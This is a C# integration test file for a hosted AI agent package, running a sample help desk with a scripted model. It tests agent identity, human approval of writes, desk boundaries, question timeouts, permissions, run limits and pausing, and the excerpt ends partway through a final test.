using System.Net.Http.Json;
using System.Text.Json;
using System.Text.Json.Nodes;
using Microsoft.AspNetCore.Mvc.Testing;
using Microsoft.EntityFrameworkCore;
using Microsoft.Extensions.DependencyInjection;
using Npgsql;

namespace AbpAgent.Host.Tests;

/// <summary>
/// Agents hosted alone, as another product hosts them: the sample help desk, its tickets in its own table,
/// on a database of its own, with the package's run queue and a scripted model. A run reads a ticket, sets its priority
/// under the agent's name in the run's change set, and answers with a note; a customer's ticket or a look at another
/// desk makes its writes ask; the switch, roles and pausing hold; a write a stop left unknown isn't repeated. Needs
/// Postgres: localhost:5432 (postgres/postgres), or the server ABPAGENT_TEST_POSTGRES names.
/// </summary>
public sealed class AgentsAloneTests : IAsyncLifetime
{
    private static readonly string Server =
        Environment.GetEnvironmentVariable("ABPAGENT_TEST_POSTGRES") is { Length: > 0 } server ? server : "Host=localhost;Port=5432;Username=postgres;Password=postgres";

    // The sample's settings (appsettings.json): an admin, Ben and Cy at the desk DESK (Ben at OPS too), and Dee, a customer.
    private const string Admin = "00000000-0000-0000-0000-0000000000a1";
    private const string Ben = "00000000-0000-0000-0000-0000000000b1";
    private const string Cy = "00000000-0000-0000-0000-0000000000c1";

    private readonly string _database = "agents_host_" + Guid.NewGuid().ToString("N")[..12];
    private WebApplicationFactory<Program>? _root;
    private WebApplicationFactory<Program>? _factory;

    public Task InitializeAsync()
    {
        // The host reads its settings as it builds, so they're the process's environment for this test.
        Environment.SetEnvironmentVariable("ConnectionStrings__Default", $"{Server};Database={_database}");
        _root = _factory = new WebApplicationFactory<Program>();
        return Task.CompletedTask;
    }

    public async Task DisposeAsync()
    {
        if (_root is not null)
        {
            await _root.DisposeAsync(); // and the host a test gave other limits
        }

        NpgsqlConnection.ClearAllPools();
        await using NpgsqlConnection connection = new($"{Server};Database=postgres");
        await connection.OpenAsync();
        await using NpgsqlCommand drop = new($"DROP DATABASE IF EXISTS \"{_database}\" WITH (FORCE)", connection);
        await drop.ExecuteNonQueryAsync();
    }

    [Fact]
    public async Task An_agent_works_a_ticket_under_its_own_name_with_the_askers_rights()
    {
        string agent = await SetUpAgentAsync("triage", """
            demo: get_ticket {"key":"$ticket"}
            demo: set_priority {"key":"$ticket","priority":"high"}
            demo-answer: I set it to high. ![chart](https://x.example/c.png)
            """);
        string ticket = await TicketAsync(Ben, "DESK", "Printer on fire");

        JsonElement run = await FinishedAsync(await SendAsync(HttpMethod.Post, $"/api/tickets/{ticket}/agent-runs", Ben, new { agentId = agent, prompt = "Triage it" }));
        Assert.Equal("done", run.GetProperty("state").GetString());
        // The run keeps its answer cleaned too, as it's drawn for its readers: an image from elsewhere is its text and address.
        Assert.Equal("I set it to high. chart (https://x.example/c.png)", run.GetProperty("answer").GetString());
        Assert.True(Tools(run) is ["get_ticket:done", "set_priority:done"], run.ToString());
        Assert.True(run.GetProperty("transcript").GetBoolean());

        JsonElement after = await SendAsync(HttpMethod.Get, $"/api/tickets/{ticket}", Ben);
        Assert.Equal("high", after.GetProperty("priority").GetString());
        JsonElement change = after.GetProperty("changes")[0];
        string account = run.GetProperty("agent").GetProperty("id").GetString()!;
        Assert.Equal(Ben, change.GetProperty("actorId").GetString());
        Assert.Equal(account, change.GetProperty("actingAccountId").GetString());
        Assert.Equal(run.GetProperty("changeSetId").GetString(), change.GetProperty("changeSetId").GetString());

        // The answer is a note by Ben, run by the agent, cleaned: the image is text and its address.
        JsonElement note = after.GetProperty("notes")[0];
        Assert.Equal(account, note.GetProperty("actingAccountId").GetString());
        Assert.False(note.GetProperty("internal").GetBoolean());
        Assert.Equal("I set it to high. chart (https://x.example/c.png)", note.GetProperty("body").GetString());

        // Cy reads the ticket, but didn't start the run: Cy sees it, not its steps or transcript.
        JsonElement seen = await SendAsync(HttpMethod.Get, $"/api/agent-runs/{run.GetProperty("id").GetString()}", Cy);
        Assert.False(seen.GetProperty("transcript").GetBoolean());
        Assert.Equal(0, seen.GetProperty("steps").GetArrayLength());
    }

    [Fact]
    public async Task A_customers_ticket_makes_the_runs_writes_ask_and_its_answer_internal()
    {
        string agent = await SetUpAgentAsync("careful", """
            demo: set_priority {"key":"$ticket","priority":"high"}
            demo-answer: It needs a person.
            """);
        string ticket = await TicketAsync(Ben, "DESK", "Please help", fromCustomer: true);

        JsonElement waiting = await WaitingAsync(await SendAsync(HttpMethod.Post, $"/api/tickets/{ticket}/agent-runs", Ben, new { agentId = agent, prompt = "Look" }));
        Assert.True(waiting.GetProperty("outside").GetBoolean());
        JsonElement question = waiting.GetProperty("question");
        Assert.Equal("set_priority", question.GetProperty("tool").GetString());
        Assert.False(question.GetProperty("canAlways").GetBoolean());
        await SendAsync(HttpMethod.Post, $"/api/agent-questions/{question.GetProperty("id").GetString()}/answer", Ben, new { answer = "refuse" });
        JsonElement run = await FinishedAsync(waiting);
        Assert.Equal(["set_priority:refused"], Tools(run));
        JsonElement after = await SendAsync(HttpMethod.Get, $"/api/tickets/{ticket}", Ben);
        Assert.Equal("normal", after.GetProperty("priority").GetString());
        Assert.True(after.GetProperty("notes")[0].GetProperty("internal").GetBoolean());
    }

    [Fact]
    public async Task A_first_change_beyond_the_runs_desk_asks_before_it_runs_whatever_the_settings_say()
    {
        // The agent's settings let set_priority run, and the run has read nothing yet: the change names another desk's
        // ticket, so it asks first and the run is marked as reaching beyond its desk.
        string elsewhere = await TicketAsync(Ben, "OPS", "Someone else's");
        string agent = await SetUpAgentAsync("reacher", $$"""
            demo: set_priority {"key":"{{elsewhere}}","priority":"high"}
            demo-answer: Done.
            """);
        string ticket = await TicketAsync(Ben, "DESK", "Here");

        JsonElement waiting = await WaitingAsync(await SendAsync(HttpMethod.Post, $"/api/tickets/{ticket}/agent-runs", Ben, new { agentId = agent, prompt = "Go" }));
        Assert.Equal("waiting", waiting.GetProperty("state").GetString());
        Assert.True(Tools(waiting) is ["set_priority:asked"], waiting.ToString());
        Assert.True(waiting.GetProperty("wide").GetBoolean());
        Assert.NotEqual("high", (await SendAsync(HttpMethod.Get, $"/api/tickets/{elsewhere}", Ben)).GetProperty("priority").GetString());
    }

    [Theory]
    [InlineData("placeless", """{"priority":"high"}""")]
    [InlineData("keyless", """{"key":"not a ticket","priority":"high"}""")]
    public async Task A_change_that_names_nowhere_it_can_be_placed_asks_before_it_runs(string key, string call)
    {
        // The host's own tool, its settings set to run, called with no ticket and no desk, or with a "key" no kind's shape
        // fits: where it would land can't be told, so it counts as beyond the run's desk (fail closed) and asks.
        string agent = await SetUpAgentAsync(key, $"""
            demo: set_priority {call}
            demo-answer: Done.
            """);
        string ticket = await TicketAsync(Ben, "DESK", "Here");

        JsonElement waiting = await WaitingAsync(await SendAsync(HttpMethod.Post, $"/api/tickets/{ticket}/agent-runs", Ben, new { agentId = agent, prompt = "Go" }));
        Assert.Equal("waiting", waiting.GetProperty("state").GetString());
        Assert.True(Tools(waiting) is ["set_priority:asked"], waiting.ToString());
        Assert.True(waiting.GetProperty("wide").GetBoolean());
    }

    [Fact]
    public async Task Reading_another_desk_makes_the_run_wide_and_its_answer_stays_in_the_run()
    {
        string agent = await SetUpAgentAsync("roamer", """
            demo: list_desks {}
            demo: set_priority {"key":"$ticket","priority":"low"}
            demo-answer: I looked elsewhere.
            """);
        await TicketAsync(Ben, "OPS", "Elsewhere");
        string ticket = await TicketAsync(Ben, "DESK", "Here");

        JsonElement waiting = await WaitingAsync(await SendAsync(HttpMethod.Post, $"/api/tickets/{ticket}/agent-runs", Ben, new { agentId = agent, prompt = "Look around" }));
        Assert.True(waiting.GetProperty("wide").GetBoolean());
        await SendAsync(HttpMethod.Post, $"/api/agent-questions/{waiting.GetProperty("question").GetProperty("id").GetString()}/answer", Ben, new { answer = "refuse" });
        JsonElement run = await FinishedAsync(waiting);
        Assert.Equal(["list_desks:done", "set_priority:refused"], Tools(run));
        Assert.Equal("I looked elsewhere.", run.GetProperty("answer").GetString());
        Assert.Equal(0, (await SendAsync(HttpMethod.Get, $"/api/tickets/{ticket}", Ben)).GetProperty("notes").GetArrayLength());
        Assert.Equal(JsonValueKind.Null, (await SendAsync(HttpMethod.Get, $"/api/agent-runs/{run.GetProperty("id").GetString()}", Cy)).GetProperty("answer").ValueKind);
    }

    [Fact]
    public async Task The_switch_roles_settings_and_pausing_hold()
    {
        HttpResponseMessage early = await RawAsync(HttpMethod.Post, "/api/agents", Admin, new { key = "early" });
        Assert.False(early.IsSuccessStatusCode);
        Assert.Contains("Agents are off", await early.Content.ReadAsStringAsync());

        string agent = await SetUpAgentAsync("asker", """
            demo: set_priority {"key":"$ticket","priority":"high"}
            """, tools: new { set_priority = "ask" });
        HttpResponseMessage admin = await RawAsync(HttpMethod.Put, $"/api/desks/OPS/agents/{agent}/take", Admin, new { roleKey = "admin" });
        Assert.Contains("isn't a role an agent can have", await admin.Content.ReadAsStringAsync());

        string ticket = await TicketAsync(Ben, "DESK", "Ask first");
        JsonElement waiting = await WaitingAsync(await SendAsync(HttpMethod.Post, $"/api/tickets/{ticket}/agent-runs", Ben, new { agentId = agent, prompt = "Go" }));
        string question = waiting.GetProperty("question").GetProperty("id").GetString()!;
        JsonElement mine = await SendAsync(HttpMethod.Get, "/api/agent-questions", Ben);
        Assert.Contains(mine.EnumerateArray(), q => q.GetProperty("id").GetString() == question);
        Assert.False((await RawAsync(HttpMethod.Post, $"/api/agent-questions/{question}/answer", Cy, new { answer = "allow" })).IsSuccessStatusCode);
        await SendAsync(HttpMethod.Post, $"/api/agent-questions/{question}/answer", Ben, new { answer = "allow" });
        JsonElement run = await FinishedAsync(waiting);
        Assert.True(Tools(run) is ["set_priority:done"], run.ToString());
        Assert.Equal("high", (await SendAsync(HttpMethod.Get, $"/api/tickets/{ticket}", Ben)).GetProperty("priority").GetString());

        string elsewhere = await TicketAsync(Ben, "OPS", "Not taken on here");
        HttpResponseMessage notTaken = await RawAsync(HttpMethod.Post, $"/api/tickets/{elsewhere}/agent-runs", Ben, new { agentId = agent, prompt = "Go" });
        Assert.Contains("OPS hasn't taken asker on", await notTaken.Content.ReadAsStringAsync());

        await SendAsync(HttpMethod.Post, $"/api/agents/{agent}/pause", Admin);
        HttpResponseMessage paused = await RawAsync(HttpMethod.Post, $"/api/tickets/{ticket}/agent-runs", Ben, new { agentId = agent, prompt = "Go" });
        Assert.Contains("asker is paused", await paused.Content.ReadAsStringAsync());
    }

    [Fact]
    public async Task Renaming_an_agent_renames_its_account_and_other_changes_leave_it()
    {
        string agent = await SetUpAgentAsync("namer", "demo-answer: Done.");
        JsonElement unchanged = await SendAsync(HttpMethod.Put, $"/api/agents/{agent}", Admin, new { instructions = "demo-answer: Still done." });
        Assert.Equal("namer", unchanged.GetProperty("account").GetProperty("displayName").GetString());

        JsonElement renamed = await SendAsync(HttpMethod.Put, $"/api/agents/{agent}", Admin, new { names = new Dictionary<string, string> { ["en"] = "Desk helper", ["ar"] = "مساعد المكتب" } });
        Assert.Equal("Desk helper", renamed.GetProperty("account").GetProperty("displayName").GetString());

        JsonElement other = await SendAsync(HttpMethod.Put, $"/api/agents/{agent}", Admin, new { instructions = "demo-answer: Done again." });
        Assert.Equal("Desk helper", other.GetProperty("account").GetProperty("displayName").GetString());
    }

    [Fact]
    public async Task An_agent_made_with_memory_off_and_its_own_limits_keeps_them_and_one_made_without_them_has_the_defaults()
    {
        await SendAsync(HttpMethod.Put, "/api/agents/settings", Admin, new { enabled = true });
        JsonElement careful = await SendAsync(HttpMethod.Post, "/api/agents", Admin, new
        {
            key = "careful", offerAll = true, instructions = "demo-answer: Done.", memory = false,
            limits = new { maxTurns = 3, maxToolCalls = 7, maxMinutes = 4, maxRunCost = 1.5m },
        });
        Assert.False(careful.GetProperty("memory").GetBoolean());
        JsonElement limits = careful.GetProperty("limits");
        Assert.Equal(3, limits.GetProperty("maxTurns").GetInt32());
        Assert.Equal(7, limits.GetProperty("maxToolCalls").GetInt32());
        Assert.Equal(4, limits.GetProperty("maxMinutes").GetInt32());
        Assert.Equal(1.5m, limits.GetProperty("maxRunCost").GetDecimal());

        JsonElement plain = await SendAsync(HttpMethod.Post, "/api/agents", Admin, new { key = "plain", offerAll = true, instructions = "demo-answer: Done." });
        Assert.True(plain.GetProperty("memory").GetBoolean());
        Assert.Equal(JsonValueKind.Null, plain.GetProperty("limits").GetProperty("maxTurns").ValueKind);
        Assert.Equal(JsonValueKind.Null, plain.GetProperty("limits").GetProperty("maxRunCost").ValueKind);
    }

    [Fact]
    public async Task A_write_a_stop_left_unknown_is_named_to_the_agent_not_repeated()
    {
        string agent = await SetUpAgentAsync("resumer", "demo-answer: I checked first.");
        string ticket = await TicketAsync(Ben, "DESK", "Half done");

        // A run whose server stopped while it set a priority: its step is still "started". Leased far ahead, so the
        // worker leaves it to this test.
        Guid runId = Guid.NewGuid();
        using (IServiceScope scope = _factory!.Services.CreateScope())
        {
            AgentsDb agentsDb = scope.ServiceProvider.GetRequiredService<AgentsDb>();
            AgentItemRef item = (await scope.ServiceProvider.GetServices<IAgentItemKind>().First(k => k.Kind == "ticket").FindAsync(ticket, default))!;
            await agentsDb.RunAsync(async db =>
            {
                AgentRun run = new(runId, Guid.Parse(agent), item.ScopeId, item, AgentTriggers.Ask, Guid.Parse(Ben), Guid.Parse(Ben), "Set it")
                {
                    State = AgentRunStates.Running, StartedAt = DateTime.UtcNow, LeasedUntil = DateTime.UtcNow.AddHours(1), Turns = 1,
                    Conversation = new JsonArray(new JsonObject { ["role"] = "user", ["content"] = $"<request>\nSet it\n</request>\n\n<ticket key=\"{ticket}\">\n</ticket>" })
                        .ToJsonString(),
                };
                db.AgentRuns.Add(run);
                db.AgentRunSteps.Add(new AgentRunStep(Guid.NewGuid(), runId, 1, "tool", "set_priority", "{}") { Writes = true });
                await db.SaveChangesAsync();
            }, requiresNew: true);

            AgentTurn turn = await scope.ServiceProvider.GetRequiredService<AgentRunner>().TurnAsync(runId, default);
            Assert.True(turn.Over);
            (AgentRun after, List<AgentRunStep> steps) = await agentsDb.RunAsync(async db =>
                (await db.AgentRuns.AsNoTracking().FirstAsync(r => r.Id == runId), await db.AgentRunSteps.AsNoTracking().Where(s => s.RunId == runId).OrderBy(s => s.Number).ToListAsync()));
            Assert.Equal(AgentStepOutcomes.Unknown, steps[0].Outcome);
            Assert.Contains("whether that happened isn't known. Check before doing it again.", after.Conversation);
            Assert.Equal("I checked first.", after.Answer);
        }
    }

    [Fact]
    public async Task The_system_starts_a_run_with_the_agents_own_role_once_per_cause_and_runs_wait_their_turn()
    {
        string agent = await SetUpAgentAsync("worker", """
            demo: set_priority {"key":"$ticket","priority":"high"}
            demo-answer: Done by the system.
            """);
        string ticket = await TicketAsync(Ben, "DESK", "Nightly");
        using IServiceScope scope = _factory!.Services.CreateScope();
        AgentRunService runs = scope.ServiceProvider.GetRequiredService<AgentRunService>();
        AgentItemRef item = (await scope.ServiceProvider.GetServices<IAgentItemKind>().First(k => k.Kind == "ticket").FindAsync(ticket, default))!;

        // No one started it: it works with the role DESK gave the agent, and the same cause starts it once.
        AgentStartResult started = await runs.StartAsync(new AgentStart(Guid.Parse(agent), "ticket", item.Id, AgentTriggers.Schedule, null, "Nightly look", "night:1"), default);
        AgentStartResult again = await runs.StartAsync(new AgentStart(Guid.Parse(agent), "ticket", item.Id, AgentTriggers.Schedule, null, "Nightly look", "night:1"), default);
        Assert.NotNull(started.RunId);
        Assert.Null(again.RunId);
        Assert.Contains("has a run for that already", again.Why);
        await FinishedAsync(await SendAsync(HttpMethod.Get, $"/api/agent-runs/{started.RunId}", Admin));
        JsonElement run = await SendAsync(HttpMethod.Get, $"/api/agent-runs/{started.RunId}", Admin);
        Assert.Equal("done", run.GetProperty("state").GetString());
        Assert.Equal(JsonValueKind.Null, run.GetProperty("startedBy").ValueKind);
        Assert.True(Tools(run) is ["set_priority:done"], run.ToString());
        JsonElement change = (await SendAsync(HttpMethod.Get, $"/api/tickets/{ticket}", Ben)).GetProperty("changes")[0];
        Assert.Equal(run.GetProperty("agent").GetProperty("id").GetString(), change.GetProperty("actorId").GetString());

        // A person who can't read the ticket starts nothing.
        AgentStartResult customer = await runs.StartAsync(new AgentStart(Guid.Parse(agent), "ticket", item.Id, AgentTriggers.Mentioned,
            Guid.Parse("00000000-0000-0000-0000-0000000000d1"), "Look"), default);
        Assert.Null(customer.RunId);

        // Two asks on one ticket: the second begins once the first has ended.
        JsonElement first = await SendAsync(HttpMethod.Post, $"/api/tickets/{ticket}/agent-runs", Ben, new { agentId = agent, prompt = "One" });
        JsonElement second = await SendAsync(HttpMethod.Post, $"/api/tickets/{ticket}/agent-runs", Ben, new { agentId = agent, prompt = "Two" });
        JsonElement one = await FinishedAsync(first), two = await FinishedAsync(second);
        Assert.True(two.GetProperty("startedAt").GetDateTime() >= one.GetProperty("endedAt").GetDateTime(), $"{one} {two}");
    }

    [Fact]
    public async Task A_question_answered_after_the_runs_working_time_lets_it_go_on_since_waiting_isnt_work()
    {
        // Longer than the package's worker takes to pick the run up again (it looks every 5 seconds when idle).
        Limits(o => o.MaxTime = TimeSpan.FromSeconds(8));
        string agent = await SetUpAgentAsync("patient", """
            demo: set_priority {"key":"$ticket","priority":"high"}
            demo-answer: Set once you said so.
            """, tools: new { set_priority = "ask" });
        string ticket = await TicketAsync(Ben, "DESK", "Wait for me");

        JsonElement waiting = await WaitingAsync(await SendAsync(HttpMethod.Post, $"/api/tickets/{ticket}/agent-runs", Ben, new { agentId = agent, prompt = "Go" }));
        await Task.Delay(TimeSpan.FromSeconds(9)); // longer than the run may work
        await SendAsync(HttpMethod.Post, $"/api/agent-questions/{waiting.GetProperty("question").GetProperty("id").GetString()}/answer", Ben, new { answer = "allow" });
        JsonElement run = await FinishedAsync(waiting);
        Assert.True(run.GetProperty("state").GetString() == "done", run.ToString());
        Assert.True(Tools(run) is ["set_priority:done"], run.ToString());
        Assert.Equal("high", (await SendAsync(HttpMethod.Get, $"/api/tickets/{ticket}", Ben)).GetProperty("priority").GetString());
    }

    [Fact]
    public async Task A_question_no_one_answers_is_refused_in_time_and_the_run_goes_on()
    {
        Limits(o => (o.MaxTime, o.QuestionTimeout) = (TimeSpan.FromSeconds(8), TimeSpan.FromSeconds(1)));
        string agent = await SetUpAgentAsync("unheard", """
            demo: set_priority {"key":"$ticket","priority":"high"}
            demo-answer: No one said, so I left it.
            """, tools: new { set_priority = "ask" });
        string ticket = await TicketAsync(Ben, "DESK", "Nobody home");

        JsonElement waiting = await WaitingAsync(await SendAsync(HttpMethod.Post, $"/api/tickets/{ticket}/agent-runs", Ben, new { agentId = agent, prompt = "Go" }));
        await Task.Delay(TimeSpan.FromSeconds(9)); // past its time, and longer than the run may work
        using (IServiceScope scope = _factory!.Services.CreateScope())
        {
            await scope.ServiceProvider.GetRequiredService<AgentRunService>().ExpireQuestionsAsync(default); // what the server's sweep does
        }

        JsonElement run = await FinishedAsync(waiting);
        Assert.Equal("done", run.GetProperty("state").GetString());
        Assert.True(Tools(run) is ["set_priority:refused"], run.ToString());
        Assert.Contains("No one answered in time", run.GetProperty("steps").EnumerateArray().First(s => s.GetProperty("kind").GetString() == "tool")
            .GetProperty("output").GetString());
        Assert.Equal("normal", (await SendAsync(HttpMethod.Get, $"/api/tickets/{ticket}", Ben)).GetProperty("priority").GetString());
    }

    [Fact]
    public async Task A_run_no_one_started_can_lend_a_persons_rights_and_asks_the_agents_responsible_person()
    {
        string agent = await SetUpAgentAsync("lent", """
            demo: set_priority {"key":"$ticket","priority":"high"}
            demo-answer: Done with Ben's rights.
            """, tools: new { set_priority = "ask" });
        string ticket = await TicketAsync(Ben, "DESK", "A rule's work");
        using IServiceScope scope = _factory!.Services.CreateScope();
        AgentRunService runs = scope.ServiceProvider.GetRequiredService<AgentRunService>();
        AgentItemRef item = (await scope.ServiceProvider.GetServices<IAgentItemKind>().First(k => k.Kind == "ticket").FindAsync(ticket, default))!;

        // A rule's run: Ben's rights, but no one is there to answer, so the agent's responsible person (the admin who made it) is asked.
        AgentStartResult started = await runs.StartAsync(new AgentStart(Guid.Parse(agent), "ticket", item.Id, AgentTriggers.Rule, null, "Set it", "rule:1")
        {
            ActorId = Guid.Parse(Ben),
        }, default);
        JsonElement waiting = await WaitingAsync(await SendAsync(HttpMethod.Get, $"/api/agent-runs/{started.RunId}", Admin));
        JsonElement asked = await SendAsync(HttpMethod.Get, $"/api/agent-runs/{started.RunId}", Admin);
        Assert.Equal(JsonValueKind.Null, asked.GetProperty("startedBy").ValueKind);
        JsonElement question = asked.GetProperty("question");
        Assert.Equal(Admin, question.GetProperty("askedOf").GetProperty("id").GetString());
        Assert.True(question.GetProperty("canAlways").GetBoolean()); // the admin may change the agent's settings: Always would set the tool to run
        await SendAsync(HttpMethod.Post, $"/api/agent-questions/{question.GetProperty("id").GetString()}/answer", Admin, new { answer = "allow" });
        await FinishedAsync(waiting);
        JsonElement change = (await SendAsync(HttpMethod.Get, $"/api/tickets/{ticket}", Ben)).GetProperty("changes")[0];
        Assert.Equal(Ben, change.GetProperty("actorId").GetString());

        // Lent by someone who can't read the ticket, it doesn't start.
        AgentStartResult customer = await runs.StartAsync(new AgentStart(Guid.Parse(agent), "ticket", item.Id, AgentTriggers.Rule, null, "Look", "rule:2")
        {
            ActorId = Guid.Parse("00000000-0000-0000-0000-0000000000d1"),
        }, default);
        Assert.Null(customer.RunId);
    }

    [Fact]
    public async Task An_outside_read_with_the_persons_own_account_runs_and_an_outside_change_asks_every_time_and_starts_off()
    {
        // Off until it's turned on (OptIn): offered to the model only once the settings name it.
        string off = await SetUpAgentAsync("poster", """
            demo: post_design {"key":"$ticket"}
            demo-answer: Posted.
            """);
        string ticket = await TicketAsync(Ben, "DESK", "Design it");
        JsonElement run = await FinishedAsync(await SendAsync(HttpMethod.Post, $"/api/tickets/{ticket}/agent-runs", Ben, new { agentId = off, prompt = "Go" }));
        Assert.Equal("refused", ToolSteps(run)[0].GetProperty("outcome").GetString());

        // A read elsewhere with Ben's own account runs, and marks the run outside but not beyond its desk; then the change asks,
        // though its setting says run, never offers "Always", and a second call asks again.
        string agent = await SetUpAgentAsync("designer", """
            demo: design_notes {}
            demo: post_design {"key":"$ticket"}
            demo: post_design {"key":"$ticket"}
            demo-answer: Posted twice.
            """, tools: new { post_design = "run" });
        run = await WaitingAsync(await SendAsync(HttpMethod.Post, $"/api/tickets/{ticket}/agent-runs", Ben, new { agentId = agent, prompt = "Go" }));
        Assert.Equal(("design_notes", "done"), (ToolSteps(run)[0].GetProperty("name").GetString(), ToolSteps(run)[0].GetProperty("outcome").GetString()));
        Assert.Contains(Ben, ToolSteps(run)[0].GetProperty("output").GetString());
        Assert.True(run.GetProperty("outside").GetBoolean());
        Assert.False(run.GetProperty("wide").GetBoolean());
        JsonElement question = run.GetProperty("question");
        Assert.Equal("post_design", question.GetProperty("tool").GetString());
        Assert.Contains("asks every time", question.GetProperty("why").GetString());
        Assert.False(question.GetProperty("canAlways").GetBoolean());
        await SendAsync(HttpMethod.Post, $"/api/agent-questions/{question.GetProperty("id").GetString()}/answer", Ben, new { answer = "allow-run" });
        run = await WaitingAsync(run);
        Assert.Equal("post_design", run.GetProperty("question").GetProperty("tool").GetString());
        await SendAsync(HttpMethod.Post, $"/api/agent-questions/{run.GetProperty("question").GetProperty("id").GetString()}/answer", Ben, new { answer = "allow" });
        run = await FinishedAsync(run);
        Assert.Equal(["design_notes", "post_design", "post_design"], ToolSteps(run).Select(s => s.GetProperty("name").GetString()));
        Assert.All(ToolSteps(run), s => Assert.Equal("done", s.GetProperty("outcome").GetString()));
    }

    [Fact]
    public async Task An_exit_whose_outputs_are_missing_is_refused_until_they_are_made_and_a_run_ending_without_them_is_reminded_twice()
    {
        // The step's "solved" needs the priority high (the sample's check): finish_step is refused with what's
        // missing, the agent makes it, and the second finish_step is taken.
        string agent = await SetUpAgentAsync("closer", """
            demo: finish_step {"exit":"solved"}
            demo: set_priority {"key":"$ticket","priority":"high"}
            demo: finish_step {"exit":"solved"}
            demo-answer: Solved.
            """);
        string ticket = await TicketAsync(Ben, "DESK", "Close it");
        using IServiceScope scope = _factory!.Services.CreateScope();
        AgentRunService runs = scope.ServiceProvider.GetRequiredService<AgentRunService>();
        AgentItemRef item = (await scope.ServiceProvider.GetServices<IAgentItemKind>().First(k => k.Kind == "ticket").FindAsync(ticket, default))!;
        AgentStartResult started = await runs.StartAsync(new AgentStart(Guid.Parse(agent), "ticket", item.Id, AgentTriggers.Workflow, null, "Solve it", "step:1")
        {
            Exits = ["solved", "escalated"],
        }, default);
        await FinishedAsync(await SendAsync(HttpMethod.Get, $"/api/agent-runs/{started.RunId}", Admin));
        JsonElement run = await SendAsync(HttpMethod.Get, $"/api/agent-runs/{started.RunId}", Admin);
        Assert.True(Tools(run) is ["finish_step:failed", "set_priority:done", "finish_step:done"], run.ToString());
        JsonElement refused = run.GetProperty("steps").EnumerateArray().First(s => s.GetProperty("kind").GetString() == "tool");
        Assert.Contains("priority set to high", refused.GetProperty("output").GetString());
        Assert.Equal("done", run.GetProperty("state").GetString());

        // A run that answers without it is told what's missing, twice, then ends as it is (the host's step decides what then).
        string forgetful = await SetUpAgentAsync("forgetful", "demo-answer: Done.");
        string other = await TicketAsync(Ben, "DESK", "Forget it");
        AgentItemRef second = (await scope.ServiceProvider.GetServices<IAgentItemKind>().First(k => k.Kind == "ticket").FindAsync(other, default))!;
        started = await runs.StartAsync(new AgentStart(Guid.Parse(forgetful), "ticket", second.Id, AgentTriggers.Workflow, null, "Solve it", "step:2"), default);
        await FinishedAsync(await SendAsync(HttpMethod.Get, $"/api/agent-runs/{started.RunId}", Admin));
        run = await SendAsync(HttpMethod.Get, $"/api/agent-runs/{started.RunId}", Admin);
        Assert.Equal("done", run.GetProperty("state").GetString());
        Assert.Equal(1 + AgentRunner.MaxReminders, run.GetProperty("turns").GetInt32());

        // A run that wasn't started for a step isn't checked at all.
        JsonElement asked = await FinishedAsync(await SendAsync(HttpMethod.Post, $"/api/tickets/{other}/agent-runs", Ben, new { agentId = forgetful, prompt = "Go" }));
        Assert.Equal(1, asked.GetProperty("turns").GetInt32());
    }

    [Fact]
    public async Task Always_allow_is_only_for_the_hosts_own_tools_and_a_standing_permission_is_listed_used_and_taken_back()
    {
        string agent = await SetUpAgentAsync("mailer", """
            demo: set_priority {"key":"$ticket","priority":"high"}
            demo: email_customer {"key":"$ticket"}
            demo-answer: Set and mailed.
            """, tools: new { set_priority = "ask", email_customer = "ask" });
        string first = await TicketAsync(Ben, "DESK", "Mail them");

        // The host's own tool may be always allowed; a plugin's, which may send, may not: "always" counts for the run only.
        JsonElement run = await WaitingAsync(await SendAsync(HttpMethod.Post, $"/api/tickets/{first}/agent-runs", Ben, new { agentId = agent, prompt = "Go" }));
        Assert.Equal("set_priority", run.GetProperty("question").GetProperty("tool").GetString());
        Assert.True(run.GetProperty("question").GetProperty("canAlways").GetBoolean());
        await SendAsync(HttpMethod.Post, $"/api/agent-questions/{run.GetProperty("question").GetProperty("id").GetString()}/answer", Ben, new { answer = "always" });
        run = await WaitingAsync(run);
        Assert.Equal("email_customer", run.GetProperty("question").GetProperty("tool").GetString());
        Assert.False(run.GetProperty("question").GetProperty("canAlways").GetBoolean());
        await SendAsync(HttpMethod.Post, $"/api/agent-questions/{run.GetProperty("question").GetProperty("id").GetString()}/answer", Ben, new { answer = "always" });
        run = await FinishedAsync(run);
        Assert.Equal(["answer:always", "answer:allow-run"], ToolSteps(run).Select(s => s.GetProperty("allowed").GetString()));

        JsonElement mine = await SendAsync(HttpMethod.Get, "/api/me/agent-permissions", Ben);
        Assert.Equal(["set_priority"], mine.EnumerateArray().Select(p => p.GetProperty("tool").GetString()));
        Assert.Equal(1, (await SendAsync(HttpMethod.Get, $"/api/agents/{agent}/permissions", Admin)).GetArrayLength());
        Assert.False((await RawAsync(HttpMethod.Get, $"/api/agents/{agent}/permissions", Cy)).IsSuccessStatusCode);

        // Next time, Ben's standing permission lets set_priority run, and the step says so; the plugin's tool asks again.
        string second = await TicketAsync(Ben, "DESK", "Mail them too");
        run = await WaitingAsync(await SendAsync(HttpMethod.Post, $"/api/tickets/{second}/agent-runs", Ben, new { agentId = agent, prompt = "Go" }));
        Assert.Equal("email_customer", run.GetProperty("question").GetProperty("tool").GetString());
        Assert.Equal($"always:{Ben}", ToolSteps(run)[0].GetProperty("allowed").GetString());
        Assert.NotEqual(JsonValueKind.Null, (await SendAsync(HttpMethod.Get, "/api/me/agent-permissions", Ben))[0].GetProperty("lastUsedAt").ValueKind);
        await SendAsync(HttpMethod.Post, $"/api/agent-runs/{run.GetProperty("id").GetString()}/stop", Ben);

        // Taken back, it asks again.
        JsonElement permission = mine[0];
        await SendAsync(HttpMethod.Post, "/api/agent-permissions/remove", Ben, new
        {
            personId = Ben, agentId = agent, tool = "set_priority", scopeId = permission.GetProperty("scopeId").GetString(),
        });
        Assert.Equal(0, (await SendAsync(HttpMethod.Get, "/api/me/agent-permissions", Ben)).GetArrayLength());
        string third = await TicketAsync(Ben, "DESK", "Ask me again");
        run = await WaitingAsync(await SendAsync(HttpMethod.Post, $"/api/tickets/{third}/agent-runs", Ben, new { agentId = agent, prompt = "Go" }));
        Assert.Equal("set_priority", run.GetProperty("question").GetProperty("tool").GetString());
        await SendAsync(HttpMethod.Post, $"/api/agent-runs/{run.GetProperty("id").GetString()}/stop", Ben);
    }

    [Fact]
    public async Task Always_allow_in_a_run_the_system_started_is_the_agents_setting_for_whoever_may_change_it()
    {
        string agent = await SetUpAgentAsync("nightly", """
            demo: set_priority {"key":"$ticket","priority":"high"}
            demo-answer: Done.
            """, tools: new { set_priority = "ask" });
        string ticket = await TicketAsync(Ben, "DESK", "Overnight");
        using IServiceScope scope = _factory!.Services.CreateScope();
